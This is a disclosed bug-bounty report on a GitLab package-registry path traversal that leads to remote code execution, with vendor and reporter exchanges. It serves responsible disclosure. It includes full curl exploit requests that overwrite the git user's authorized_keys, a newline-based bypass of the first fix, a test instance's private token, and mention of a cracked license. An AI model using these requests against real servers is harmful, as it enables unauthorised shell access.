---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
  - vuln/path-traversal
  - impact/rce
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2022-06-07
submitted: 2019-11-09T12:03:21.882Z
bounty_usd: 12000
votes: 142
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "saltyyolk"
source: "https://hackerone.com/reports/733072"
title: "Path traversal, to RCE"
---
# Path traversal, to RCE

> **Severity:** High | **Bounty:** 12,000 USD | **Votes:** 142 | **Program:** GitLab | **Disclosed:** 2022-06-07

- Report: [https://hackerone.com/reports/733072](https://hackerone.com/reports/733072)
- CWE: Command Injection - Generic
- Submitted: 2019-11-09T12:03:21.882Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

## Timeline

- **Report Filed**
- **2019-11-09** @gitlab-securitybot: Hi @nyangawa,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2019-11-09** @saltyyolk: I checked a little bit deeper into the root cause of this issue, and I think it's partially a problem of Grape.

As the vulnerable route is defined with a `requirements`, 

```
MAVEN_ENDPOINT_REQUIREMENTS = {                                                                                    
      file_name: API::NO_SLASH_URL_PART_REGEX                                                                          
}.freeze 
...
NO_SLASH_URL_PART_REGEX = %r{[^/]+}.freeze
...
puts 'packages/maven/*path/:file_name', requirements: MAVEN_ENDPOINT_REQUIREMENTS do

```

However in Grape, they only validates the pre-decoded URL to the compiled regular expression in

```
/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/grape-1.1.0/lib/grape/router.rb
```

This is where all these problems come from.

And FYI, according to this finding, I think there are still some more API endpoints which are vulnerable to similar URL encoding attack, the endpoint of NPM package registry could be another victim. I would suggest a thorough auditing and try to fix this bug in a more fundamental way~
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Triaged**
- **2019-11-21** @gitlab-securitybot: ETA for fix:

Hi @nyangawa,

The issue you reported is currently scheduled to be fixed by 2019-12-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-11-27** @gitlab_cmaxim: Hello @nyangawa, 

Thank you again for the report! Your finding has just been patched in GitLab version 12.5.1.  Please take a look and check if you can find a bypass. 
Your report will be published in 30 days in GitLab's issue tracker.

We will keep you updated about the final bounty amount.

Best regards,
Costel
Security Team | GitLab Inc.
- **2019-11-27** @saltyyolk: Hey @gitlab_cmaxim,
Your actions are really quick!

Thanks for letting me know the new release. However I have a tiny concern on the fix:

```
@maven_file_name_regex ||= %r{^[A-Za-z0-9\.\_\-\+]+$}.freeze
```

\A\z and ^$ behave differently in Ruby, and the latter is vulnerable to multi-line attack, which means something like:

```
"1st-line\n../../../../.ssh/authorized_keys" matches the above regular expression well
```

Therefore, the endpoint could still be vulnerable to the path traversal attack, as the added regular expression only validates the file_name after url decoding. A simple PoC could be like:

```
asakawa@asakawa-ThinkStation-S20:~$ curl -H "Private-Token: xQsDqzWrsUKsNCwdtXGT" http://10.26.0.3/api/v4/projects/1/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/a%0a%2f%2e %2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.p ub; echo
{"id":2,"package_id":1,"created_at":"2019-11-27T14:24:05.132Z","updated_at":"2019-11-27T14:24:05.132Z","size":414,"file_type":null,"file_store":1,"file_md5":"ed0446e05cbca05729bcd85cfd97cc8d","file_sha1":"5bd99d355f116cb173bc3a3bef8e5cac935cec5d","file_name":"a\n/../../../../../../../../../../../.ssh/authorized_keys","file":{"url":"/var/opt/gitlab/.ssh/authorized_keys"}}
asakawa@asakawa-ThinkStation-S20:~$ docker exec -ti gitlab_web_1 bash
root@localhost:/# find . -name 'authorized_keys'
./opt/gitlab/embedded/service/gitlab-shell/bin/authorized_keys
./var/opt/gitlab/.ssh/authorized_keys
root@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRNXgO58zSnbP73Z86MLnTfkmWTPcvFckRmCd4QNTa09PNx+UkexfVC48nfC3VYMCdIir4tv/7v9ean7TNcj8qljbXWGkKtjthblMV4M+RVsq/9mQB/XhfnvwX5XGT3ar7T27sa7I5LBqJs4vCStSmd841zPak5L38EiO6BAwdBM1Y2rws6smtF3BtWY0rd5tnnMKFt4zGGdEaL/stVsDkbGccEKDDDGfjYiFNfvm6Jvr18LIOwFvkxYaRvy+6l5V5sVXckGo5BMMD8GwaDd4kl8z8BhJgehHY0batSv/Lf5O5EH2hUSKxRD/FFKIuJSnbMdNb8TJKueiwh/wTnIsx asakawa@asakawa-ThinkStation-S20
```

This exploit works on my 12.5.1-ee instance.

Best regards,
Li
- **2019-11-27** @gitlab_cmaxim: Hey @nyangawa, 

Thanks for looking into this and for the POC. I will inform the engineering team and update you through HackerOne. 

Regards,
Costel
- **2019-11-27** @gitlab_cmaxim: @nyangawa, 
We are considering to update the regex with:  `/\A[A-Za-z0-9\.\_\-\+]+\z/` 
What do you think?

Thanks,
Costel
- **2019-11-28** @saltyyolk: @gitlab_cmaxim,

The new regex looks perfect to prevent path traversal attacks.
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
